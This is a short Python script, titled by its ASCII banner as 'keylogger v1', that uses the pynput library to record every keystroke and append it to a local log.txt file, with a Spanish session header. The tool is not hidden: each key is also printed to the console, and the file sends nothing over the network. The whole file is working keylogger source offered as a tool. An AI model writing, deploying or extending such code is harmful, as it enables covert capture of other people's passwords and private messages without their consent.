#----------------------------------------------------------------------
#pip install pynput
from pynput.keyboard import Key, Listener
#
# _              _                                     _   _           
#| | _____ _   _| | ___   __ _  __ _  ___ _ __  __   _/ | | |__  _   _ 
#| |/ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__| \ \ / / | | '_ \| | | |
#|   <  __/ |_| | | (_) | (_| | (_| |  __/ |     \ V /| | | |_) | |_| |
#|_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|      \_/ |_| |_.__/ \__, |
#          |___/         |___/ |___/                             |___/ 
#                      _     _ _____                                   
#                     | |__ (_)___  | __  _ __                         
#                     | '_ \| |  / / '_ \| '_ \                        
#                     | | | | | / /| | | | | | |                       
#                     |_| |_|_|/_/ |_| |_|_| |_|                       
#
with open("log.txt", "a") as new:
	x=f"\n\n{'{nueva sesión}':-^60}\n\n"
	new.write(x)

print()

count = 0
keys = []


def on_press(key):
	global keys, count
	print("{0} pressed".format(key))
	keys.append(key)
	count += 1
	if count >= 10:
		count = 0
		write_log(keys)
		keys = []


def on_release(key):
	if key == Key.esc:
		write_log(keys)
		return False

def write_log(list):
	with open("log.txt", "a") as log:
		for key in list:
			k = str(key).replace("'", "")
			if k == "Key.space":
				k = " "
			if k == "Key.enter":
				k = "\n"
			log.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
